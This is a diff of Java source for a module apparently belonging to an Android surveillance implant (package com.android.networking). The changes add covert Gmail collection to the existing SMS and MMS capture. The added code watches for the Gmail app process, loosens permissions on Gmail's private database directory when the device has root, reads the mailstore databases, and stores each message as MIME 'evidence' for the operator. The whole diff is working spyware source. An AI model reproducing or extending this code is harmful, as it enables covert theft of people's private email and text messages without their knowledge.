@@ -9,21 +9,35 @@
 
 package com.android.networking.module;
 
+import java.io.File;
+import java.io.FilenameFilter;
 import java.io.IOException;
+import java.io.UnsupportedEncodingException;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.Hashtable;
 import java.util.Iterator;
+import java.util.concurrent.Semaphore;
 
 import com.android.networking.Messages;
+import com.android.networking.ProcessInfo;
+import com.android.networking.ProcessStatus;
+import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ChildConf;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.conf.ConfigurationException;
+import com.android.networking.db.GenericSqliteHelper;
 import com.android.networking.evidence.EvidenceType;
 import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.evidence.Markup;
+import com.android.networking.file.AutoFile;
+import com.android.networking.file.Path;
 import com.android.networking.interfaces.Observer;
+import com.android.networking.listener.ListenerProcess;
 import com.android.networking.listener.ListenerSms;
+import com.android.networking.module.email.Email;
+import com.android.networking.module.email.GmailVisitor;
 import com.android.networking.module.message.Filter;
 import com.android.networking.module.message.Mms;
 import com.android.networking.module.message.MmsBrowser;
@@ -37,8 +51,6 @@ import com.android.networking.util.DateTime;
 import com.android.networking.util.Utils;
 import com.android.networking.util.WChar;
 
-
-
 /**
  * The Class MessageAgent.
  * 
@@ -50,9 +62,11 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	private static final String TAG = "ModuleMessage"; //$NON-NLS-1$
 	//$NON-NLS-1$
 	private static final int SMS_VERSION = 2010050501;
+	private static final int MAIL_VERSION2 = 2012030601;
 	private static final int ID_MAIL = 0;
 	private static final int ID_SMS = 1;
 	private static final int ID_MMS = 2;
+	private static final int MAIL_PROGRAM = 2;
 	private boolean mailEnabled;
 	private boolean smsEnabled;
 	private boolean mmsEnabled;
@@ -61,9 +75,10 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	Markup storedMMS;
 	Markup storedSMS;
-	//Markup storedEMAIL;
+	Markup storedMAIL;
 
 	private Markup configMarkup;
+	private Hashtable<String, Integer> lastMail = new Hashtable<String, Integer>();
 	private int lastMMS;
 	private int lastSMS;
 	private Filter[] filterCollect = new Filter[3];
@@ -78,7 +93,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 		storedMMS = new Markup(this, 1);
 		storedSMS = new Markup(this, 2);
-		//storedEMAIL = new Markup(this, 4);
+		storedMAIL = new Markup(this, 4);
 		configMarkup = new Markup(this, 3);
 
 		String[] config = new String[] { "", "", "" };
@@ -95,7 +110,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 				}
 				oldConfig = new String[] { "", "", "" };
 			}
-		}else{
+		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (parse): no oldConfig available");
 			}
@@ -104,12 +119,16 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		// {"mms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-28 09:40:05"}},"sms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-01 00:00:00"}},"mail":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2011-02-01 00:00:00"}},"module":"messages"}
 		try {
 
-			mailEnabled = readJson(ID_MAIL, Messages.getString("18_1"), conf, config);
+			if(Cfg.ENABLE_MAIL_MODULE){
+				mailEnabled = Status.self().haveRoot() && readJson(ID_MAIL, Messages.getString("18_1"), conf, config);
+			}else{
+				mailEnabled = false;
+			}
 			smsEnabled = readJson(ID_SMS, Messages.getString("18_7"), conf, config);
 			mmsEnabled = readJson(ID_MMS, Messages.getString("18_9"), conf, config);
 
 			if (!config[ID_MAIL].equals(oldConfig[ID_MAIL])) {
-				// configMailChanged = true;
+				storedMAIL.removeMarkup();
 			}
 
 			if (!config[ID_SMS].equals(oldConfig[ID_SMS])) {
@@ -160,7 +179,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			if (history) {
 				Date from = filter.getDate(Messages.getString("18_5")); //$NON-NLS-1$
 				Date to = filter.getDate(Messages.getString("18_6"), null); //$NON-NLS-1$
-				//sizeToLog = 
+				// sizeToLog =
 
 				filterCollect[id] = new Filter(history, from, to, maxSizeToLog, maxSizeToLog);
 				digestConfMail += "_" + from + "_" + to;
@@ -174,9 +193,45 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		return enabled;
 	}
 
+	class ProcessMailObserver implements Observer<ProcessInfo> {
+
+		private String pObserving = "com.google.android.gm";
+
+		@Override
+		public int notification(ProcessInfo process) {
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification): " + process);
+			}
+			if (process.processInfo.processName.contains(pObserving)) {
+				if (process.status == ProcessStatus.STOP) {
+					try {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (notification), observing found: " + process.processInfo.processName);
+						}
+						readHistoricMail(lastMail);
+					} catch (IOException e) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (notification) Error: " + e);
+						}
+					}
+				}
+			}
+			return 0;
+		}
+
+	}
+
+	ProcessMailObserver obs;
+
 	@Override
 	public void actualStart() {
-		ListenerSms.self().attach(this);
+
+		if (mailEnabled) {
+			obs = new ProcessMailObserver();
+			initMail();
+			ListenerProcess.self().attach(obs);
+		}
 
 		if (smsEnabled) {
 			initSms();
@@ -188,6 +243,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 		if (smsEnabled || mmsEnabled) {
 			// Iniziamo la cattura live
+			ListenerSms.self().attach(this);
 			msgHandler = new MsgHandler(smsEnabled, mmsEnabled);
 			msgHandler.start();
 		}
@@ -196,7 +252,18 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	@Override
 	public void actualStop() {
-		ListenerSms.self().detach(this);
+
+		if (mailEnabled) {
+			initMail();
+			if (obs != null) {
+				ListenerProcess.self().detach(obs);
+				obs = null;
+			}
+		}
+
+		if (smsEnabled) {
+			ListenerSms.self().detach(this);
+		}
 		if (msgHandler != null) {
 			msgHandler.quit();
 		}
@@ -206,6 +273,35 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	@Override
 	public void actualGo() {
 
+		if (mailEnabled) {
+			try {
+				readHistoricMail(lastMail);
+			} catch (IOException e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (initMail) Error: " + e);
+				}
+			}
+		}
+
+		if (smsEnabled) {
+			int mylastSMS = readHistoricSms(lastSMS);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (initSms): next lastSMS: " + mylastSMS);
+			}
+			updateMarkupSMS(mylastSMS);
+
+		}
+
+	}
+
+	private void initMail() {
+		lastMail = storedMAIL.unserialize(new Hashtable<String, Integer>());
+		if(Cfg.ONE_MAIL){
+			lastMail.put("mailstore.proc.test@gmail.com.db", 3886);
+		}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (initMail), read lastMail: " + lastMail);
+		}
 	}
 
 	private void initSms() {
@@ -222,12 +318,6 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 				}
 			}
 		}
-
-		int mylastSMS = readHistoricSms(lastSMS);
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (initSms): next lastSMS: " + mylastSMS);
-		}
-		updateMarkupSMS(mylastSMS);
 
 		/*
 		 * if (!storedSMS.isMarkup()) { int lastSMS = readHistoricSms();
@@ -276,6 +366,112 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 				Check.log(TAG + " (updateMarkupSMS) Error: " + e);
 			}
 		}
+	}
+
+	public void updateMarkupMail(String mailstore, int newLastId, boolean serialize) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (updateMarkupMail), mailStore: " + mailstore + " +lastId: " + newLastId);
+		}
+
+		lastMail.put(mailstore, newLastId);
+		try {
+			if (serialize || (newLastId % 10 == 0)) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (updateMarkupMail), write lastId: " + newLastId);
+				}
+				storedMAIL.writeMarkupSerializable(lastMail);
+			}
+		} catch (IOException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (updateMarkupMail) Error: " + e);
+			}
+		}
+	}
+
+	Semaphore stillReadingEmail = new Semaphore(1);
+
+	private String[] getMailStores(String databasePath) {
+		File dir = new File(databasePath);
+		File parent = new File(dir.getParent());
+
+		Path.unprotect(parent.getParent());
+		Path.unprotect(parent.getAbsolutePath());
+		Path.unprotect(dir.getAbsolutePath());
+
+		FilenameFilter filterdb = new FilenameFilter() {
+			public boolean accept(File directory, String fileName) {
+				// i_3=mailstore.
+				return fileName.endsWith(".db") && fileName.startsWith(Messages.getString("i_3"));
+			}
+		};
+
+		FilenameFilter filterall = new FilenameFilter() {
+			public boolean accept(File directory, String fileName) {
+				// i_3=mailstore.
+				return fileName.startsWith(Messages.getString("i_3"));
+			}
+		};
+
+		for (String file : dir.list(filterall)) {
+			Path.unprotect(dir + "/" + file, true);
+		}
+
+		String[] mailstores = dir.list(filterdb);
+		return mailstores;
+	}
+
+	private int readHistoricMail(Hashtable<String, Integer> lastMail) throws IOException {
+
+		if (stillReadingEmail.tryAcquire()) {
+
+			try {
+				// i_1=/data/data/com.google.android.gm/databases
+				String databasePath = Messages.getString("i_1");
+
+				String[] mailstores = getMailStores(databasePath);
+				for (String mailstore : mailstores) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (readHistoricMail) mailstore: " + mailstore);
+					}
+
+					AutoFile file = new AutoFile(mailstore);
+
+					GmailVisitor visitor = new GmailVisitor(this, mailstore, filterCollect[ID_MAIL]);
+					GenericSqliteHelper helper = GenericSqliteHelper.open(databasePath, mailstore);
+
+					int lastId = lastMail.containsKey(mailstore) ? lastMail.get(mailstore) : 0;
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (readHistoricMail), mailstore: " + mailstore + " lastId: " + lastId);
+					}
+					visitor.lastId = lastId;
+
+					// i_2=messages
+					// Messages.getString("i_2")
+					int newLastId = (int) helper.traverseRecords("messages", visitor);
+					
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (readHistoricMail) finished, newLastId: " + newLastId);
+					}
+
+					if (newLastId > lastId) {
+						updateMarkupMail(mailstore, newLastId, true);
+					}
+				}
+			} catch (Exception ex) {
+				if (Cfg.DEBUG) {
+					ex.printStackTrace();
+					Check.log(TAG + " (readHistoricMail) Error: " + ex);
+				}
+			} finally {
+				stillReadingEmail.release();
+			}
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (readHistoricMail), still reading...");
+			}
+		}
+
+		return 0;
 	}
 
 	private int readHistoricMms(int lastMMS) {
@@ -334,7 +530,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		final long date = sms.getDate();
 		final boolean sent = sms.getSent();
 
-		saveEvidence(address, body, date, sent);
+		saveEvidenceSms(address, body, date, sent);
 	}
 
 	private void saveMms(Mms mms) {
@@ -354,10 +550,51 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 		final boolean sent = mms.getSent();
 
-		saveEvidence(address, subject, date, sent);
+		saveEvidenceSms(address, subject, date, sent);
 	}
 
-	private void saveEvidence(String address, byte[] body, long date, boolean sent) {
+	public boolean saveEmail(Email message) {
+
+		int maxMessageSize = 50 * 1024;
+		final String mail = message.makeMimeMessage(maxMessageSize);
+
+		if (filterCollect[ID_MAIL].filterMessage(message.getDate(), mail.length(), 0) == Filter.FILTERED_OK) {
+
+			saveEvidenceEmail(message, mail);
+		}
+		return isStopRequested();
+
+	}
+
+	private void saveEvidenceEmail(Email message, String mail) {
+		Check.asserts(mail != null, "Null mail"); //$NON-NLS-1$
+
+		int size = mail.length();
+		final int flags = message.isIncoming() ? 0x10 : 0x0;
+
+		final DateTime filetime = new DateTime(message.getReceivedDate());
+
+		final byte[] additionalData = new byte[24];
+
+		final DataBuffer databuffer = new DataBuffer(additionalData, 0, 24);
+		databuffer.writeInt(MAIL_VERSION2);
+		databuffer.writeInt(flags);
+		databuffer.writeInt(size);
+		databuffer.writeLong(filetime.getFiledate());
+		databuffer.writeInt(MAIL_PROGRAM);
+
+		Check.asserts(additionalData.length == 24, "Mail Wrong buffer size: " + additionalData.length); //$NON-NLS-1$
+
+		try {
+			EvidenceReference.atomic(EvidenceType.MAIL_RAW, additionalData, mail.getBytes("UTF-8"));
+		} catch (UnsupportedEncodingException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (saveEmail) Error: " + e);
+			}
+		} //$NON-NLS-1$
+	}
+
+	private boolean saveEvidenceSms(String address, byte[] body, long date, boolean sent) {
 
 		String from, to;
 
@@ -386,6 +623,8 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		databuffer.write(ByteArray.padByteArray(to.getBytes(), 16));
 
 		EvidenceReference.atomic(EvidenceType.SMS_NEW, additionalData, body);
+
+		return isStopRequested();
 	}
 
 	public int notification(Sms s) {
